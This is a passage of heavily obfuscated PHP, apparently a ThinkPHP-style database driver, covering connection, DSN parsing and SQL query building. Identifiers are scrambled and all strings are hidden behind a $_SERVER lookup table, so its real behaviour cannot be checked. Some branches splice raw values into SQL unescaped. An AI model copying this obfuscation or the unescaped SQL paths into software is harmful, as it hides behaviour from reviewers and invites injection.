$½Å»ƒ«ş[$­‚©ä£[958]], $­‚©ä£[902] => $½Å»ƒ«ş[$­‚©ä£[959]], $­‚©ä£[17] => isset($½Å»ƒ«ş[$­‚©ä£[960]]) ? $½Å»ƒ«ş[$­‚©ä£[960]] : array()); } elseif (empty($½Å»ƒ«ş)) { if (think_config($­‚©ä£[961]) && $­‚©ä£[950] != strtolower(think_config($­‚©ä£[962]))) { $½Å»ƒ«ş = $this->parseDSN(think_config($­‚©ä£[961])); } else { $½Å»ƒ«ş = array($­‚©ä£[947] => think_config($­‚©ä£[962]), $­‚©ä£[874] => think_config($­‚©ä£[963]), $­‚©ä£[875] => think_config($­‚©ä£[964]), $­‚©ä£[872] => think_config($­‚©ä£[965]), $­‚©ä£[873] => think_config($­‚©ä£[966]), $­‚©ä£[21] => think_config($­‚©ä£[250]), $­‚©ä£[902] => think_config($­‚©ä£[961]), $­‚©ä£[17] => think_config($­‚©ä£[967])); } } return $½Å»ƒ«ş; } protected function initConnect($Ç’—Ç·ì = true) { if (1 == think_config($_SERVER[¥Ÿ©ÒèÌ][22])) { $this->_linkID = $this->multiConnect($Ç’—Ç·ì); } else { if ($this->config) { $this->configLast = $this->config; } } if (!$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $€—¶í©… => $±¯øÄ«) { $this->_linkID = $±¯øÄ«; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($¾¦ùÎÚ = false) { $Û•âóë¯ =& $_SERVER[¥Ÿ©ÒèÌ]; static $éıìÙö‰ = array(); static $è¤ğç = -1; if (empty($éıìÙö‰)) { foreach ($this->config as $£¦µ«ÅÉ => $à·ÒİóÜ) { $éıìÙö‰[$£¦µ«ÅÉ] = explode($Û•âóë¯[50], $à·ÒİóÜ); } } if (think_config($Û•âóë¯[968])) { if ($¾¦ùÎÚ || think_config($Û•âóë¯[397]) === !0) { $‚„Óæ¯× = floor(mt_rand(0, think_config($Û•âóë¯[969]) - 1)); $è¤ğç = $‚„Óæ¯×; } else { if (is_numeric(think_config($Û•âóë¯[970]))) { $‚„Óæ¯× = think_config($Û•âóë¯[970]); } else { $‚„Óæ¯× = floor(mt_rand(think_config($Û•âóë¯[969]), count($éıìÙö‰[$Û•âóë¯[872]]) - 1)); } } } else { $‚„Óæ¯× = floor(mt_rand(0, count($éıìÙö‰[$Û•âóë¯[872]]) - 1)); $è¤ğç = $‚„Óæ¯×; } $‚„Óæ¯× = $è¤ğç !== -1 ? $è¤ğç : $‚„Óæ¯×; $‰¼Îƒèı = array($Û•âóë¯[874] => isset($éıìÙö‰[$Û•âóë¯[874]][$‚„Óæ¯×]) ? $éıìÙö‰[$Û•âóë¯[874]][$‚„Óæ¯×] : $éıìÙö‰[$Û•âóë¯[874]][0], $Û•âóë¯[875] => isset($éıìÙö‰[$Û•âóë¯[875]][$‚„Óæ¯×]) ? $éıìÙö‰[$Û•âóë¯[875]][$‚„Óæ¯×] : $éıìÙö‰[$Û•âóë¯[875]][0], $Û•âóë¯[872] => isset($éıìÙö‰[$Û•âóë¯[872]][$‚„Óæ¯×]) ? $éıìÙö‰[$Û•âóë¯[872]][$‚„Óæ¯×] : $éıìÙö‰[$Û•âóë¯[872]][0], $Û•âóë¯[873] => isset($éıìÙö‰[$Û•âóë¯[873]][$‚„Óæ¯×]) ? $éıìÙö‰[$Û•âóë¯[873]][$‚„Óæ¯×] : $éıìÙö‰[$Û•âóë¯[873]][0], $Û•âóë¯[21] => isset($éıìÙö‰[$Û•âóë¯[21]][$‚„Óæ¯×]) ? $éıìÙö‰[$Û•âóë¯[21]][$‚„Óæ¯×] : $éıìÙö‰[$Û•âóë¯[21]][0], $Û•âóë¯[902] => isset($éıìÙö‰[$Û•âóë¯[902]][$‚„Óæ¯×]) ? $éıìÙö‰[$Û•âóë¯[902]][$‚„Óæ¯×] : $éıìÙö‰[$Û•âóë¯[902]][0], $Û•âóë¯[17] => isset($éıìÙö‰[$Û•âóë¯[17]][$‚„Óæ¯×]) ? $éıìÙö‰[$Û•âóë¯[17]][$‚„Óæ¯×] : $éıìÙö‰[$Û•âóë¯[17]][0]); return $this->connect($‰¼Îƒèı, $‚„Óæ¯×); } public function parseDSN($¡¼ü£È) { $˜µå–ì =& $_SERVER[¥Ÿ©ÒèÌ]; if (empty($¡¼ü£È)) { return !1; } $úå¹³é = parse_url($¡¼ü£È); if ($úå¹³é[$˜µå–ì[173]]) { $…®é® = array($˜µå–ì[947] => $úå¹³é[$˜µå–ì[173]], $˜µå–ì[874] => isset($úå¹³é[$˜µå–ì[594]]) ? $úå¹³é[$˜µå–ì[594]] : $˜µå–ì[12], $˜µå–ì[875] => isset($úå¹³é[$˜µå–ì[971]]) ? $úå¹³é[$˜µå–ì[971]] : $˜µå–ì[12], $˜µå–ì[872] => isset($úå¹³é[$˜µå–ì[174]]) ? $úå¹³é[$˜µå–ì[174]] : $˜µå–ì[12], $˜µå–ì[873] => isset($úå¹³é[$˜µå–ì[175]]) ? $úå¹³é[$˜µå–ì[175]] : $˜µå–ì[12], $˜µå–ì[21] => isset($úå¹³é[$˜µå–ì[78]]) ? substr($úå¹³é[$˜µå–ì[78]], 1) : $˜µå–ì[12]); } else { preg_match($˜µå–ì[972], trim($¡¼ü£È), $ÉÇØÛîÏ); $…®é® = array($˜µå–ì[947] => $ÉÇØÛîÏ[1], $˜µå–ì[874] => $ÉÇØÛîÏ[2], $˜µå–ì[875] => $ÉÇØÛîÏ[3], $˜µå–ì[872] => $ÉÇØÛîÏ[4], $˜µå–ì[873] => $ÉÇØÛîÏ[5], $˜µå–ì[21] => $ÉÇØÛîÏ[6]); } $…®é®[$˜µå–ì[902]] = $˜µå–ì[12]; return $…®é®; } protected function debug() { $®Ÿ‰™¾Ş =& $_SERVER[¥Ÿ©ÒèÌ]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $®Ÿ‰™¾Ş[973]; if (think_config($®Ÿ‰™¾Ş[974])) { think_status($®Ÿ‰™¾Ş[975]); think_trace($this->queryStr . $®Ÿ‰™¾Ş[976] . think_status($®Ÿ‰™¾Ş[24], $®Ÿ‰™¾Ş[975], 6) . $®Ÿ‰™¾Ş[977], $®Ÿ‰™¾Ş[12], $®Ÿ‰™¾Ş[978]); } } protected function parseLock($ÍàÑÇÏğ = false) { $µüİÇİş =& $_SERVER[¥Ÿ©ÒèÌ]; if (!$ÍàÑÇÏğ) { return $µüİÇİş[12]; } if ($µüİÇİş[904] == $this->dbType) { return $µüİÇİş[979]; } return $µüİÇİş[980]; } protected function parseSet($üİòóÕÓ) { $’§‹’ÑĞ =& $_SERVER[¥Ÿ©ÒèÌ]; foreach ($üİòóÕÓ as $ùÅ‘ºÖƒ => $¼¨¼ü) { if (is_array($¼¨¼ü) && $’§‹’ÑĞ[301] == $¼¨¼ü[0]) { $±ª³İ†ñ[] = $this->parseKey($ùÅ‘ºÖƒ) . $’§‹’ÑĞ[870] . $¼¨¼ü[1]; } elseif (is_scalar($¼¨¼ü) || is_null($¼¨¼ü)) { $±ª³İ†ñ[] = $this->parseKey($ùÅ‘ºÖƒ) . $’§‹’ÑĞ[870] . $this->parseValue($¼¨¼ü); } } return $’§‹’ÑĞ[981] . implode($’§‹’ÑĞ[50], $±ª³İ†ñ); } protected function bindParam($“¡¯™˜Ñ, $¸ó¡Œ¦) { $this->bind[$_SERVER[¥Ÿ©ÒèÌ][4] . $“¡¯™˜Ñ] = $¸ó¡Œ¦; } protected function parseBind($¹õïçßõ) { $¹õïçßõ = array_merge($this->bind, $¹õïçßõ); $this->bind = array(); return $¹õïçßõ; } function parseKey(&$ÜÈ§¥Ü‡, $ğº¢éÍ… = true) { if ($ğº¢éÍ…) { $ÜÈ§¥Ü‡ = $this->parseKeyCheck($ÜÈ§¥Ü‡); } return $ÜÈ§¥Ü‡; } function parseKeyCheck($ñ‚ıŠÁ¸) { $ĞØİàóÒ =& $_SERVER[¥Ÿ©ÒèÌ]; $ñ‚ıŠÁ¸ = trim($ñ‚ıŠÁ¸); if (!preg_match($ĞØİàóÒ[982], $ñ‚ıŠÁ¸)) { think_exception($ĞØİàóÒ[983] . $ñ‚ıŠÁ¸); } return $ñ‚ıŠÁ¸; } protected function parseValue($æÖëß‰) { $˜Ìı˜Ä· =& $_SERVER[¥Ÿ©ÒèÌ]; if (is_string($æÖëß‰)) { $æÖëß‰ = $˜Ìı˜Ä·[943] . $this->escapeString($æÖëß‰) . $˜Ìı˜Ä·[943]; } elseif (isset($æÖëß‰[0]) && is_string($æÖëß‰[0]) && strtolower($æÖëß‰[0]) == $˜Ìı˜Ä·[301]) { $æÖëß‰ = $this->escapeString($æÖëß‰[1]); } elseif (is_array($æÖëß‰)) { $æÖëß‰ = array_map(array($this, $˜Ìı˜Ä·[944]), $æÖëß‰); } elseif (is_bool($æÖëß‰)) { $æÖëß‰ = $æÖëß‰ ? $˜Ìı˜Ä·[89] : $˜Ìı˜Ä·[190]; } elseif (is_null($æÖëß‰)) { $æÖëß‰ = $˜Ìı˜Ä·[104]; } return $æÖëß‰; } protected function parseField($š´¢şùˆ) { $Úùõ§Àé =& $_SERVER[¥Ÿ©ÒèÌ]; if (is_string($š´¢şùˆ) && strpos($š´¢şùˆ, $Úùõ§Àé[50])) { $š´¢şùˆ = explode($Úùõ§Àé[50], $š´¢şùˆ); } if (is_array($š´¢şùˆ)) { $¶ÃñİÅ  = array(); foreach ($š´¢şùˆ as $ëïÎÄ® => $·¦Æ•È) { if (!is_numeric($ëïÎÄ®)) { $¶ÃñİÅ [] = $this->parseKey($ëïÎÄ®, !1) . $Úùõ§Àé[984] . $this->parseKey($·¦Æ•È); } else { $¶ÃñİÅ [] = $this->parseKey($·¦Æ•È); } } $ÊôÓâ‰÷ = implode($Úùõ§Àé[50], $¶ÃñİÅ ); } elseif (is_string($š´¢şùˆ) && !empty($š´¢şùˆ)) { $ÊôÓâ‰÷ = $š´¢şùˆ; } else { $ÊôÓâ‰÷ = $Úùõ§Àé[181]; } return $ÊôÓâ‰÷; } protected function parseTable($ê¶»ÈÃ) { $ŠÔÉşƒÍ =& $_SERVER[¥Ÿ©ÒèÌ]; if (is_array($ê¶»ÈÃ)) { $ÏÆÙ¶’ = array(); foreach ($ê¶»ÈÃ as $éá–ŞÄ => $‘Êı¬É) { if (!is_numeric($éá–ŞÄ)) { $ÏÆÙ¶’[] = $this->parseKey($éá–ŞÄ) . $ŠÔÉşƒÍ[53] . $this->parseKey($‘Êı¬É); } else { $ÏÆÙ¶’[] = $this->parseKey($éá–ŞÄ); } } $ê¶»ÈÃ = $ÏÆÙ¶’; } elseif (is_string($ê¶»ÈÃ)) { if (strstr($ê¶»ÈÃ, $ŠÔÉşƒÍ[53])) { return $ê¶»ÈÃ; } $ê¶»ÈÃ = explode($ŠÔÉşƒÍ[50], $ê¶»ÈÃ); array_walk($ê¶»ÈÃ, array($this, $ŠÔÉşƒÍ[892])); } return $ŠÔÉşƒÍ[886] . trim(implode($ŠÔÉşƒÍ[985], $ê¶»ÈÃ), $ŠÔÉşƒÍ[389]) . $ŠÔÉşƒÍ[886]; } protected function parseWhere($İË¶ó‘ú) { $¨µÛ»áÖ =& $_SERVER[¥Ÿ©ÒèÌ]; $Ÿû¬Ì°‹ = $¨µÛ»áÖ[12]; if (is_string($İË¶ó‘ú)) { $Ÿû¬Ì°‹ = $İË¶ó‘ú; } else { $£Àøº«à = isset($İË¶ó‘ú[$¨µÛ»áÖ[986]]) ? strtoupper($İË¶ó‘ú[$¨µÛ»áÖ[986]]) : $¨µÛ»áÖ[12]; if (in_array($£Àøº«à, array($¨µÛ»áÖ[987], $¨µÛ»áÖ[988], $¨µÛ»áÖ[989]))) { $£Àøº«à = $¨µÛ»áÖ[53] . $£Àøº«à . $¨µÛ»áÖ[53]; unset($İË¶ó‘ú[$¨µÛ»áÖ[986]]); } else { $£Àøº«à = $¨µÛ»áÖ[990]; } foreach ($İË¶ó‘ú as $äÍŠ“¿ => $¤²Ìæ‘ç) { $Ÿû¬Ì°‹ .= $¨µÛ»áÖ[281]; if (is_numeric($äÍŠ“¿)) { $äÍŠ“¿ = $¨µÛ»áÖ[991]; } if (0 === strpos($äÍŠ“¿, $¨µÛ»áÖ[11])) { $Ÿû¬Ì°‹ .= $this->parseThinkWhere($äÍŠ“¿, $¤²Ìæ‘ç); } else { if (!preg_match($¨µÛ»áÖ[992], trim($äÍŠ“¿))) { think_exception(think_lang($¨µÛ»áÖ[993]) . $¨µÛ»áÖ[4] . $äÍŠ“¿); } $‘¨Ó“‡ = is_array($¤²Ìæ‘ç) && isset($¤²Ìæ‘ç[$¨µÛ»áÖ[994]]); $äÍŠ“¿ = trim($äÍŠ“¿); if (strpos($äÍŠ“¿, $¨µÛ»áÖ[287])) { $şÖ×ëü = explode($¨µÛ»áÖ[287], $äÍŠ“¿); $ÄÒÂÒÚ¾ = array(); foreach ($şÖ×ëü as $´èÖ½é¶ => $˜ïè¨š) { $ï½›Ò¦± = $‘¨Ó“‡ ? $¤²Ìæ‘ç[$´èÖ½é¶] : $¤²Ìæ‘ç; $ÄÒÂÒÚ¾[] = $¨µÛ»áÖ[264] . $this->parseWhereItem($this->parseKey($˜ïè¨š), $ï½›Ò¦±) . $¨µÛ»áÖ[891]; } $Ÿû¬Ì°‹ .= implode($¨µÛ»áÖ[995], $ÄÒÂÒÚ¾); } elseif (strpos($äÍŠ“¿, $¨µÛ»áÖ[288])) { $şÖ×ëü = explode($¨µÛ»áÖ[288], $äÍŠ“¿); $ÄÒÂÒÚ¾ = array(); foreach ($şÖ×ëü as $´èÖ½é¶ => $˜ïè¨š) { $ï½›Ò¦± = $‘¨Ó“‡ ? $¤²Ìæ‘ç[$´èÖ½é¶] : $¤²Ìæ‘ç; $ÄÒÂÒÚ¾[] = $¨µÛ»áÖ[264] . $this->parseWhereItem($this->parseKey($˜ïè¨š), $ï½›Ò¦±) . $¨µÛ»áÖ[891]; } $Ÿû¬Ì°‹ .= implode($¨µÛ»áÖ[990], $ÄÒÂÒÚ¾); } else { $Ÿû¬Ì°‹ .= $this->parseWhereItem($this->parseKey($äÍŠ“¿), $¤²Ìæ‘ç); } } $Ÿû¬Ì°‹ .= $¨µÛ»áÖ[282] . $£Àøº«à; } $Ÿû¬Ì°‹ = substr($Ÿû¬Ì°‹, 0, -strlen($£Àøº«à)); } return empty($Ÿû¬Ì°‹) ? $¨µÛ»áÖ[12] : $¨µÛ»áÖ[996] . $Ÿû¬Ì°‹; } protected function parseWhereItem($ÍÄíˆë, $³–û–Ÿ¶) { $ú™’Š¾ù =& $_SERVER[¥Ÿ©ÒèÌ]; $îÂÌ „Ø = $ú™’Š¾ù[12]; if (is_array($³–û–Ÿ¶)) { if (is_string($³–û–Ÿ¶[0])) { $ù˜õ§½™ = strtolower($³–û–Ÿ¶[0]); if (in_array($³–û–Ÿ¶[0], array($ú™’Š¾ù[870], $ú™’Š¾ù[997], $ú™’Š¾ù[998], $ú™’Š¾ù[999], $ú™’Š¾ù[1000], $ú™’Š¾ù[1001]))) { $îÂÌ „Ø .= $ÍÄíˆë . $ú™’Š¾ù[53] . $³–û–Ÿ¶[0] . $ú™’Š¾ù[53] . $this->parseValue($³–û–Ÿ¶[1]); } elseif (preg_match($ú™’Š¾ù[1002], $³–û–Ÿ¶[0])) { $îÂÌ „Ø .= $ÍÄíˆë . $ú™’Š¾ù[53] . $this->exp[$ù˜õ§½™] . $ú™’Š¾ù[53] . $this->parseValue($³–û–Ÿ¶[1]); } elseif (preg_match($ú™’Š¾ù[1003], $³–û–Ÿ¶[0])) { if (is_array($³–û–Ÿ¶[1])) { $ë­ØÉæ€ = isset($³–û–Ÿ¶[2]) ? strtoupper($³–û–Ÿ¶[2]) : $ú™’Š¾ù[988]; if (in_array($ë­ØÉæ€, array($ú™’Š¾ù[987], $ú™’Š¾ù[988], $ú™’Š¾ù[989]))) { $ë£ÛŸÉ = array(); foreach ($³–û–Ÿ¶[1] as $èëÛâüˆ) { $ë£ÛŸÉ[] = $ÍÄíˆë . $ú™’Š¾ù[53] . $this->exp[$ù˜õ§½™] . $ú™’Š¾ù[53] . $this->parseValue($èëÛâüˆ); } $îÂÌ „Ø .= $ú™’Š¾ù[264] . implode($ú™’Š¾ù[53] . $ë­ØÉæ€ . $ú™’Š¾ù[53], $ë£ÛŸÉ) . $ú™’Š¾ù[891]; } } else { $îÂÌ „Ø .= $ÍÄíˆë . $ú™’Š¾ù[53] . $this->exp[$ù˜õ§½™] . $ú™’Š¾ù[53] . $this->parseValue($³–û–Ÿ¶[1]); } } elseif ($ú™’Š¾ù[301] == $ù˜õ§½™) { $îÂÌ „Ø .= $ú™’Š¾ù[889] . $ÍÄíˆë . $ú™’Š¾ù[53] . $³–û–Ÿ¶[1] . $ú™’Š¾ù[1004]; } elseif (preg_match($ú™’Š¾ù[1005], $³–û–Ÿ¶[0])) { $îÂÌ „Ø .= $³–û–Ÿ¶[0]; } elseif (preg_match($ú™’Š¾ù[1006], $³–û–Ÿ¶[0])) { if (isset($³–û–Ÿ¶[2]) && $ú™’Š¾ù[301] == $³–û–Ÿ¶[2]) { $îÂÌ „Ø .= $ÍÄíˆë . $ú™’Š¾ù[53] . $this->exp[$ù˜õ§½™] . $ú™’Š¾ù[53] . $³–û–Ÿ¶[1]; } else { if (is_string($³–û–Ÿ¶[1])) { $³–û–Ÿ¶[1] = explode($ú™’Š¾ù[50], $³–û–Ÿ¶[1]); } $›£ãö¾ = implode($ú™’Š¾ù[50], $this->parseValue($³–û–Ÿ¶[1])); $îÂÌ „Ø .= $ÍÄíˆë . $ú™’Š¾ù[53] . $this->exp[$ù˜õ§½™] . $ú™’Š¾ù[889] . $›£ãö¾ . $ú™’Š¾ù[891]; } } elseif (preg_match($ú™’Š¾ù[1007], $³–û–Ÿ¶[0])) { $µİµˆÒ‰ = is_string($³–û–Ÿ¶[1]) ? explode($ú™’Š¾ù[50], $³–û–Ÿ¶[1]) : $³–û–Ÿ¶[1]; $îÂÌ „Ø .= $ú™’Š¾ù[889] . $ÍÄíˆë . $ú™’Š¾ù[53] . $this->exp[$ù˜õ§½™] . $ú™’Š¾ù[53] . $this->parseValue($µİµˆÒ‰[0]) . $ú™’Š¾ù[990] . $this->parseValue($µİµˆÒ‰[1]) . $ú™’Š¾ù[282]; } else { think_exception(think_lang($ú™’Š¾ù[993]) . $ú™’Š¾ù[4] . $³–û–Ÿ¶[0]); } } else { $É«ƒ»ò = count($³–û–Ÿ¶); $×¥Ÿœ½Ó = $ú™’Š¾ù[12]; if (is_string($³–û–Ÿ¶[$É«ƒ»ò - 1])) { $×¥Ÿœ½Ó = isset($³–û–Ÿ¶[$É«ƒ»ò - 1]) ? strtoupper($³–û–Ÿ¶[$É«ƒ»ò - 1]) : $ú™’Š¾ù[12]; if (in_array($×¥Ÿœ½Ó, array($ú™’Š¾ù[987], $ú™’Š¾ù[988], $ú™’Š¾ù[989]))) { $É«ƒ»ò = $É«ƒ»ò - 1; } } else { $×¥Ÿœ½Ó = $ú™’Š¾ù[987]; } for ($İ·ÊÊÄ = 0; $İ·ÊÊÄ < $É«ƒ»ò; $İ·ÊÊÄ++) { $µİµˆÒ‰ = is_array($³–û–Ÿ¶[$İ·ÊÊÄ]) ? $³–û–Ÿ¶[$İ·ÊÊÄ][1] : $³–û–Ÿ¶[$İ·ÊÊÄ]; if ($ú™’Š¾ù[301] == strtolower($³–û–Ÿ¶[$İ·ÊÊÄ][0])) { $îÂÌ „Ø .= $ú™’Š¾ù[264] . $ÍÄíˆë . $ú™’Š¾ù[53] . $µİµˆÒ‰ . $ú™’Š¾ù[1004] . $×¥Ÿœ½Ó . $ú™’Š¾ù[53]; } else { $‰Š¤ñ´ = is_array($³–û–Ÿ¶[$İ·ÊÊÄ]) ? $this->exp[strtolower($³–û–Ÿ¶[$İ·ÊÊÄ][0])] : $ú™’Š¾ù[870]; if (!$‰Š¤ñ´ && is_array($³–û–Ÿ¶[$İ·ÊÊÄ]) && in_array($³–û–Ÿ¶[$İ·ÊÊÄ][0], array($ú™’Š¾ù[870], $ú™’Š¾ù[997], $ú™’Š¾ù[998], $ú™’Š¾ù[999], $ú™’Š¾ù[1000], $ú™’Š¾ù[1001]))) { $‰Š¤ñ´ = $³–û–Ÿ¶[$İ·ÊÊÄ][0]; } $îÂÌ „Ø .= $ú™’Š¾ù[264] . $ÍÄíˆë . $ú™’Š¾ù[53] . $‰Š¤ñ´ . $ú™’Š¾ù[53] . $this->parseValue($µİµˆÒ‰) . $ú™’Š¾ù[1004] . $×¥Ÿœ½Ó . $ú™’Š¾ù[53]; } } $îÂÌ „Ø = substr($îÂÌ „Ø, 0, -4); } } else { $îÂÌ „Ø .= $ÍÄíˆë . $ú™’Š¾ù[1008] . $this->parseValue($³–û–Ÿ¶); } return $îÂÌ „Ø; } protected function parseThinkWhere($²ß‚µ‰¦, $¨ŠËù¤Õ) { $ãª€ª¶— =& $_SERVER[¥Ÿ©ÒèÌ]; $×ÎÍÀ¯Ç = $ãª€ª¶—[12]; switch ($²ß‚µ‰¦) { case $ãª€ª¶—[356]: $×ÎÍÀ¯Ç = $¨ŠËù¤Õ; break; case $ãª€ª¶—[991]: $×ÎÍÀ¯Ç = is_string($¨ŠËù¤Õ) ? $¨ŠËù¤Õ : substr($this->parseWhere($¨ŠËù¤Õ), 6); break; case $ãª€ª¶—[1009]: parse_str($¨ŠËù¤Õ, $¯ÃÓŸ¼Ú); if (isset($¯ÃÓŸ¼Ú[$ãª€ª¶—[986]])) { $àù®›çÚ = $ãª€ª¶—[53] . strtoupper($¯ÃÓŸ¼Ú[$ãª€ª¶—[986]]) . $ãª€ª¶—[53]; unset($¯ÃÓŸ¼Ú[$ãª€ª¶—[986]]); } else { $àù®›çÚ = $ãª€ª¶—[990]; } $‰¬ùñ = array(); foreach ($¯ÃÓŸ¼Ú as $µÛÑéÂ => $û³¼’±µ) { $‰¬ùñ[] = $this->parseKey($µÛÑéÂ) . $ãª€ª¶—[1008] . $this->parseValue($û³¼’±µ); } $×ÎÍÀ¯Ç = implode($àù®›çÚ, $‰¬ùñ); break; } return $×ÎÍÀ¯Ç; } protected function parseLimit($ôæ†öÙ²) { $£ìƒš²ö =& $_SERVER[¥Ÿ©ÒèÌ]; return !empty($ôæ†öÙ²) ? $£ìƒš²ö[51] . $ôæ†öÙ² . $£ìƒš²ö[53] : $£ìƒš²ö[12]; } protected function parseJoin($ƒ™ØÉÓ•) { $ûÊ‘ûŞÜ =& $_SERVER[¥Ÿ©ÒèÌ]; $¬­Åúí = $ûÊ‘ûŞÜ[12]; if (!empty($ƒ™ØÉÓ•)) { if (is_array($ƒ™ØÉÓ•)) { foreach ($ƒ™ØÉÓ• as $»×ß¨”‘ => $Í†üÇƒë) { if (!1 !== stripos($Í†üÇƒë, $ûÊ‘ûŞÜ[1010])) { $¬­Åúí .= $ûÊ‘ûŞÜ[53] . $Í†üÇƒë; } else { $¬­Åúí .= $ûÊ‘ûŞÜ[1011] . $Í†üÇƒë; } } } else { $¬­Åúí .= $ûÊ‘ûŞÜ[1011] . $ƒ™ØÉÓ•; } } $¬­Åúí = preg_replace($ûÊ‘ûŞÜ[1012], think_config($ûÊ‘ûŞÜ[916]) . $ûÊ‘ûŞÜ[1013], $¬­Åúí); return $¬­Åúí; } protected function parseOrder($çê¢´×÷) { $²Æ±¸¬ =& $_SERVER[¥Ÿ©ÒèÌ]; if (is_array($çê¢´×÷)) { $å¾÷éş‰ = array(); foreach ($çê¢´×÷ as $ğ¥ÖúßÎ => $¡‹œ½Êì) { if (is_numeric($ğ¥ÖúßÎ)) { $å¾÷éş‰[] = $this->parseKey($¡‹œ½Êì); } else { $¡‹œ½Êì = in_array(strtoupper(trim($¡‹œ½Êì)), array($²Æ±¸¬[1014], $²Æ±¸¬[1015])) ? $²Æ±¸¬[53] . $¡‹œ½Êì : $²Æ±¸¬[12]; if (preg_match($²Æ±¸¬[1016], $ğ¥ÖúßÎ)) { $å¾÷éş‰[] = $this->parseKey($ğ¥ÖúßÎ) . $¡‹œ½Êì; } else { think_exception($²Æ±¸¬[1017] . $ğ¥ÖúßÎ); } } } $çê¢´×÷ = implode($²Æ±¸¬[50], $å¾÷éş‰); } return !empty($çê¢´×÷) ? $²Æ±¸¬[1018] . $çê¢´×÷ : $²Æ±¸¬[12]; } protected function parseGroup($¸±ÔáÆ) { $ışËêÆå =& $_SERVER[¥Ÿ©ÒèÌ]; return !empty($¸±ÔáÆ) ? $ışËêÆå[1019] . $¸±ÔáÆ : $ışËêÆå[12]; } protected function parseHaving($ë©Ö“­¼) { $Ø®¼²‡Ø =& $_SERVER[¥Ÿ©ÒèÌ]; return !empty($ë©Ö“­¼) ? $Ø®¼²‡Ø[1020] . $ë©Ö“­¼ : $Ø®¼²‡Ø[12]; } protected function parseComment($Îãú“¡‘) { $ÕÉŞ•‚Ã =& $_SERVER[¥Ÿ©ÒèÌ]; return !empty($Îãú“¡‘) ? $ÕÉŞ•‚Ã[1021] . $Îãú“¡‘ . $ÕÉŞ•‚Ã[1022] : $ÕÉŞ•‚Ã[12]; } protected function parseDistinct($Á‰Üõ»ç) { $´ÇÈ¨€ =& $_SERVER[¥Ÿ©ÒèÌ]; return !empty($Á‰Üõ»ç) ? $´ÇÈ¨€[1023] : $´ÇÈ¨€[12]; } protected function parseUnion($¢…«ıˆÑ) { $Õ˜ñÄ†í =& $_SERVER[¥Ÿ©ÒèÌ]; if (empty($¢…«ıˆÑ)) { return $Õ˜ñÄ†í[12]; } if (isset($¢…«ıˆÑ[$Õ˜ñÄ†í[352]])) { $ƒƒ = $Õ˜ñÄ†í[1024]; unset($¢…«ıˆÑ[$Õ˜ñÄ†í[352]]); } else { $ƒƒ = $Õ˜ñÄ†í[1025]; } foreach ($¢…«ıˆÑ as $±óÚ°Ù©) { $¾ü•Â£[] = $ƒƒ . (is_array($±óÚ°Ù©) ? $this->buildSelectSql($±óÚ°Ù©) : $±óÚ°Ù©); } return implode($Õ˜ñÄ†í[53], $¾ü•Â£); } public function insert($÷©æ•ìĞ, $Ù¥×·Æ = array(), $…‡½šô‰ = false) { $¼ü«×éÄ =& $_SERVER[¥Ÿ©ÒèÌ]; $ç”æÜƒò = $¦¾ÏÛŒƒ = array(); $this->model = $Ù¥×·Æ[$¼ü«×éÄ[285]]; foreach ($÷©æ•ìĞ as $â…€Èï§ => $”¥¿Ÿ§) { if (is_array($”¥¿Ÿ§) && $¼ü«×éÄ[301] == $”¥¿Ÿ§[0]) { $¦¾ÏÛŒƒ[] = $this->parseKey($â…€Èï§); $ç”æÜƒò[] = $”¥¿Ÿ§[1]; } elseif (is_scalar($”¥¿Ÿ§) || is_null($”¥¿Ÿ§)) { $¦¾ÏÛŒƒ[] = $this->parseKey($â…€Èï§); $ç”æÜƒò[] = $this->parseValue($”¥¿Ÿ§); } } $áãÎÀ—Ò = ($…‡½šô‰ ? $¼ü«×éÄ[893] : $¼ü«×éÄ[894]) . $¼ü«×éÄ[895] . $this->parseTable($Ù¥×·Æ[$¼ü«×éÄ[283]]) . $¼ü«×éÄ[889] . implode($¼ü«×éÄ[50], $¦¾ÏÛŒƒ) . $¼ü«×éÄ[890] . implode($¼ü«×éÄ[50], $ç”æÜƒò) . $¼ü«×éÄ[891]; $áãÎÀ—Ò .= $this->parseLock(isset($Ù¥×·Æ[$¼ü«×éÄ[833]]) ? $Ù¥×·Æ[$¼ü«×éÄ[833]] : !1); $áãÎÀ—Ò .= $this->parseComment(!empty($Ù¥×·Æ[$¼ü«×éÄ[358]]) ? $Ù¥×·Æ[$¼ü«×éÄ[358]] : $¼ü«×éÄ[12]); return $this->execute($áãÎÀ—Ò, $this->parseBind(!empty($Ù¥×·Æ[$¼ü«×éÄ[289]]) ? $Ù¥×·Æ[$¼ü«×éÄ[289]] : array())); } public function selectInsert($¾ıÕ§÷, $ñÉé½œ—, $ûÇ£Îë¬ = array()) { $„µ†Îñº =& $_SERVER[¥Ÿ©ÒèÌ]; $this->model = $ûÇ£Îë¬[$„µ†Îñº[285]]; if (is_string($¾ıÕ§÷)) { $¾ıÕ§÷ = explode($„µ†Îñº[50], $¾ıÕ§÷); } array_walk($¾ıÕ§÷, array($this, $„µ†Îñº[892])); $•õº”ôÑ = $„µ†Îñº[1026] . $this->parseTable($ñÉé½œ—) . $„µ†Îñº[889] . implode($„µ†Îñº[50], $¾ıÕ§÷) . $„µ†Îñº[1004]; $•õº”ôÑ .= $this->buildSelectSql($ûÇ£Îë¬); return $this->execute($•õº”ôÑ, $this->parseBind(!empty($ûÇ£Îë¬[$„µ†Îñº[289]]) ? $ûÇ£Îë¬[$„µ†Îñº[289]] : array())); } public function update($å¼àë É, $¹ƒ¨ŸÖ) { $”£†¨ñÆ =& $_SERVER[¥Ÿ©ÒèÌ]; $this->model = $¹ƒ¨ŸÖ[$”£†¨ñÆ[285]]; $†å™¥Ô = $”£†¨ñÆ[1027] . $this->parseTable($¹ƒ¨ŸÖ[$”£†¨ñÆ[283]]) . $this->parseSet($å¼àë É) . $this->parseWhere(!empty($¹ƒ¨ŸÖ[$”£†¨ñÆ[279]]) ? $¹ƒ¨ŸÖ[$”£†¨ñÆ[279]] : $”£†¨ñÆ[12]) . $this->parseOrder(!empty($¹ƒ¨ŸÖ[$”£†¨ñÆ[369]]) ? $¹ƒ¨ŸÖ[$”£†¨ñÆ[369]] : $”£†¨ñÆ[12]) . $this->parseLimit(!empty($¹ƒ¨ŸÖ[$”£†¨ñÆ[296]]) ? $¹ƒ¨ŸÖ[$”£†¨ñÆ[296]] : $”£†¨ñÆ[12]) . 